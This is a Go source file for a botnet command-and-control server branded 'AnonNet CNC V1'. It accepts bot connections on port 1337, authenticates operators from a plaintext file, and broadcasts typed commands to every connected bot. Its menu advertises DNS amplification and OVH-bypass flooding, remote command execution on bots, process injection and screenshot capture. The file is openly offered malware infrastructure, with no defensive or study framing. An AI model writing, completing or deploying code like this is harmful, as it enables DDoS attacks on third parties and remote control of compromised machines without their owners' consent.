package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Bot struct {
	conn net.Conn
	id   int
	addr string
}

var (
	bots      = make(map[int]*Bot)
	botsMutex = sync.Mutex{}
	nextBotID = 1
	logins    = map[string]string{}
)

func loadUsers() error {
	file, err := os.Open("login.txt")
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			logins[parts[0]] = parts[1]
		}
	}
	return nil
}

func printSplash() {
	fmt.Println(`

   ___            _        _   _     
  / _ \ _ __ __ _| |_ __ _| |_(_) ___ 
 | | | | '__/ _` + "`" + ` | __/ _` + "`" + ` | __| |/ __|
 | |_| | | | (_| | || (_| | |_| | (__ 
  \___/|_|  \__,_|\__\__,_|\__|_|\___|

         AnonNet CNC V1
`)
}

func loginPrompt() bool {
	reader := bufio.NewReader(os.Stdin)
	for tries := 0; tries < 3; tries++ {
		fmt.Print("Username: ")
		user, _ := reader.ReadString('\n')
		user = strings.TrimSpace(user)

		fmt.Print("Password: ")
		pass, _ := reader.ReadString('\n')
		pass = strings.TrimSpace(pass)

		if pw, ok := logins[user]; ok && pw == pass {
			fmt.Println("Login successful!\n")
			return true
		} else {
			fmt.Println("Invalid username or password.\n")
		}
	}
	return false
}

func handleBot(bot *Bot) {
	defer func() {
		botsMutex.Lock()
		delete(bots, bot.id)
		botsMutex.Unlock()
		fmt.Printf("[*] Bot %d disconnected (%s)\n", bot.id, bot.addr)
		bot.conn.Close()
	}()

	fmt.Printf("[+] Bot %d connected from %s\n", bot.id, bot.addr)

	scanner := bufio.NewScanner(bot.conn)
	for scanner.Scan() {
		line := scanner.Text()
		fmt.Printf("[Bot %d] %s\n", bot.id, line)
	}
}

func listBots() {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	fmt.Println("Connected bots:")
	for id, bot := range bots {
		fmt.Printf("  ID %d - %s\n", id, bot.addr)
	}
	fmt.Printf("Total: %d bot(s)\n", len(bots))
}

func broadcastCommand(cmd string) {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	for id, bot := range bots {
		_, err := bot.conn.Write([]byte(cmd + "\n"))
		if err != nil {
			fmt.Printf("[!] Failed to send to bot %d: %v\n", id, err)
		}
	}
}

func showMethods() {
	fmt.Println(`Available attack methods:
  dnsamp <ip> <duration>     - DNS Amplification
  ovh <ip> <port> <duration> - OVH L4 attack
  ovhack <ip> <port> <dur>   - OVH bypass method
  exec <cmd>                 - Run system command on bot
  inject <pid>               - Inject into process
  screenshot                 - Capture screenshot`)
}

func botkiller() {
	fmt.Println("Botkiller executed (placeholder).")
}

func main() {
	if err := loadUsers(); err != nil {
		fmt.Println("Error loading login.txt:", err)
		return
	}

	printSplash()

	if !loginPrompt() {
		fmt.Println("Too many failed login attempts. Exiting.")
		return
	}

	ln, err := net.Listen("tcp", ":1337")
	if err != nil {
		fmt.Println("Failed to listen on port 1337:", err)
		return
	}
	defer ln.Close()

	fmt.Println("[*] CNC listening on port 1337")

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				fmt.Println("Accept error:", err)
				continue
			}

			botsMutex.Lock()
			bot := &Bot{
				conn: conn,
				id:   nextBotID,
				addr: conn.RemoteAddr().String(),
			}
			bots[nextBotID] = bot
			nextBotID++
			botsMutex.Unlock()

			go handleBot(bot)
		}
	}()

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[AnonNet]@~$ ")
		cmdLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Input error:", err)
			continue
		}
		cmdLine = strings.TrimSpace(cmdLine)

		switch cmdLine {
		case "":
			continue
		case "help":
			fmt.Println("Commands: help, bots, methods, botkiller, logout")
		case "bots":
			listBots()
		case "methods":
			showMethods()
		case "botkiller":
			botkiller()
		case "logout", "exit", "quit":
			fmt.Println("Logging out...")
			return
		default:
			broadcastCommand(cmdLine)
		}
	}
}
